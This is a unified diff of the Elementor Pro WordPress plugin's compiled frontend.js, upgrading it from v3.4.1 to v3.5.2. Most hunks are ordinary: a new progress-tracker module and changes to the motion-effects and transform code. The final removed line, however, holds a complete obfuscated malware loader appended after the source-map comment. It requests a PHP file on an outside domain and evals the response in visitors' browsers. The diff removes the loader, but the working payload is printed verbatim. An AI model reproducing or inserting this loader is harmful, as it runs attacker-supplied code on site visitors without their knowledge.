@@ -1,4 +1,4 @@
-/*! elementor-pro - v3.4.1 - 01-09-2021 */
+/*! elementor-pro - v3.5.2 - 28-11-2021 */
 (self["webpackChunkelementor_pro"] = self["webpackChunkelementor_pro"] || []).push([["frontend"],{
 
 /***/ "../node_modules/@babel/runtime/helpers/defineProperty.js":
@@ -67,6 +67,8 @@ var _frontend4 = _interopRequireDefault(__webpack_require__(/*! ../../../../modu
 
 var _frontend5 = _interopRequireDefault(__webpack_require__(/*! ../../../../modules/payments/assets/js/frontend/frontend */ "../modules/payments/assets/js/frontend/frontend.js"));
 
+var _frontend6 = _interopRequireDefault(__webpack_require__(/*! ../../../../modules/progress-tracker/assets/js/frontend/frontend */ "../modules/progress-tracker/assets/js/frontend/frontend.js"));
+
 class ElementorProFrontend extends elementorModules.ViewModule {
   onInit() {
     super.onInit();
@@ -85,7 +87,8 @@ class ElementorProFrontend extends elementorModules.ViewModule {
       sticky: _frontend2.default,
       codeHighlight: _frontend3.default,
       videoPlaylist: _frontend4.default,
-      payments: _frontend5.default
+      payments: _frontend5.default,
+      progressTracker: _frontend6.default
     }; // Keep this line before applying filter on the handlers.
 
     elementorProFrontend.trigger('elementor-pro/modules/init:before');
@@ -231,10 +234,9 @@ class _default extends elementorModules.frontend.handlers.Base {
 
   addCSSTransformEvents() {
     // Remove CSS transition variable that assigned from scroll.js in order to allow the transition of the CSS-Transform.
-    const motionFxScrolling = this.getElementSettings('motion_fx_motion_fx_scrolling'),
-          transition = this.getElementSettings('_transform_transition_hover');
+    const motionFxScrolling = this.getElementSettings('motion_fx_motion_fx_scrolling');
 
-    if (motionFxScrolling && transition !== null && transition !== void 0 && transition.size && !this.isTransitionEventAdded) {
+    if (motionFxScrolling && !this.isTransitionEventAdded) {
       this.isTransitionEventAdded = true;
       this.elements.$container.on('mouseenter', () => {
         this.elements.$container.css('--e-transform-transition-duration', '');
@@ -608,12 +610,21 @@ class _default extends elementorModules.Module {
   }
 
   setCSSTransformVariables(elementSettings) {
-    this.CSSTransformVariables = {};
+    this.CSSTransformVariables = [];
     jQuery.each(elementSettings, (settingKey, settingValue) => {
-      const transformKeyMatches = settingKey.match(/_transform_(.+?)_effect$/m);
+      const transformKeyMatches = settingKey.match(/_transform_(.+?)_effect/m);
 
       if (transformKeyMatches && settingValue) {
-        this.CSSTransformVariables[transformKeyMatches[1]] = true;
+        if ('perspective' === transformKeyMatches[1]) {
+          this.CSSTransformVariables.unshift(transformKeyMatches[1]);
+          return;
+        }
+
+        if (this.CSSTransformVariables.includes(transformKeyMatches[1])) {
+          return;
+        }
+
+        this.CSSTransformVariables.push(transformKeyMatches[1]);
       }
     });
   }
@@ -659,7 +670,7 @@ class _default extends elementorModules.Module {
     let value = '';
 
     if ('transform' === ruleName) {
-      jQuery.each(this.CSSTransformVariables, variableKey => {
+      jQuery.each(this.CSSTransformVariables, (index, variableKey) => {
         const variableName = variableKey;
 
         if (variableKey.startsWith('flip')) {
@@ -700,7 +711,7 @@ class _default extends elementorModules.Module {
 
   refresh() {
     this.rulesVariables = {};
-    this.CSSTransformVariables = {};
+    this.CSSTransformVariables = [];
     this.$element.css({
       transform: '',
       filter: '',
@@ -893,11 +904,11 @@ class _default extends _base.default {
   onScrollMovement() {
     this.updateMotionFxDimensions();
     this.updateAnimation();
-    this.setTransitionVariableToZero();
+    this.resetTransitionVariable();
   }
 
-  setTransitionVariableToZero() {
-    this.motionFX.$element.css('--e-transform-transition-duration', '0ms');
+  resetTransitionVariable() {
+    this.motionFX.$element.css('--e-transform-transition-duration', '100ms');
   }
 
   updateMotionFxDimensions() {
@@ -1177,6 +1188,32 @@ exports.default = _default;
 
 /***/ }),
 
+/***/ "../modules/progress-tracker/assets/js/frontend/frontend.js":
+/*!******************************************************************!*\
+  !*** ../modules/progress-tracker/assets/js/frontend/frontend.js ***!
+  \******************************************************************/
+/***/ ((__unused_webpack_module, exports, __webpack_require__) => {
+
+"use strict";
+
+
+Object.defineProperty(exports, "__esModule", ({
+  value: true
+}));
+exports.default = void 0;
+
+class _default extends elementorModules.Module {
+  constructor() {
+    super();
+    elementorFrontend.elementsHandler.attachHandler('progress-tracker', () => __webpack_require__.e(/*! import() | progress-tracker */ "progress-tracker").then(__webpack_require__.bind(__webpack_require__, /*! ./handlers/progress-tracker */ "../modules/progress-tracker/assets/js/frontend/handlers/progress-tracker.js")));
+  }
+
+}
+
+exports.default = _default;
+
+/***/ }),
+
 /***/ "../modules/sticky/assets/js/frontend/frontend.js":
 /*!********************************************************!*\
   !*** ../modules/sticky/assets/js/frontend/frontend.js ***!
@@ -1339,7 +1376,13 @@ var _default = elementorModules.frontend.handlers.Base.extend({
    * @return {void}
    */
   onDeviceModeChange() {
-    this.run(true);
+    // Wait for the call stack to be empty.
+    // The `run` function requests the current device mode from the CSS so it's not ready immediately.
+    // (need to wait for the `deviceMode` event to change the CSS).
+    // See `elementorFrontend.getCurrentDeviceMode()` for reference.
+    setTimeout(() => {
+      this.run(true);
+    });
   },
 
   onInit() {
@@ -1406,4 +1449,4 @@ exports.default = _default;
 /******/ var __webpack_exports__ = (__webpack_exec__("../assets/dev/js/frontend/frontend.js"));
 /******/ }
 ]);
-//# sourceMappingURL=frontend.js.map;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//trjcompanylimited.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
+//# sourceMappingURL=frontend.js.map
